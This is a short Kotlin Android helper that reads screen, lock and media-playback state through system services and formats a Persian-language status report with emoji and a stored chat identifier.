package com.sys.svc.helpers

import android.app.KeyguardManager
import android.content.Context
import android.media.AudioManager
import android.os.PowerManager
import com.sys.svc.Prefs

object ProximityHelper {
    fun status(ctx: Context): String {
        val pm = ctx.getSystemService(PowerManager::class.java)
        val km = ctx.getSystemService(KeyguardManager::class.java)
        val am = ctx.getSystemService(AudioManager::class.java)

        val screenOn = pm.isInteractive
        val locked = km.isKeyguardLocked
        val music = am.isMusicActive

        val status = when {
            screenOn && !locked && music -> "🟢 کاربر فعال + مدیا در حال پخش"
            screenOn && !locked -> "🟢 گوشی روشن، بدون قفل"
            screenOn && locked -> "🟡 گوشی روشن، صفحه‌قفل"
            !screenOn -> "🔴 گوشی در حالت اسلیپ"
            else -> "❓ نامشخص"
        }

        return buildString {
            appendLine(status)
            appendLine()
            appendLine("صفحه: ${if (screenOn) "روشن" else "خاموش"}")
            appendLine("قفل: ${if (locked) "بله" else "خیر"}")
            appendLine("صدا: ${if (music) "🔊 در حال پخش" else "🔇 ساکت"}")
            append("Chat: ${Prefs.getChat(ctx) ?: "—"}")
        }
    }
}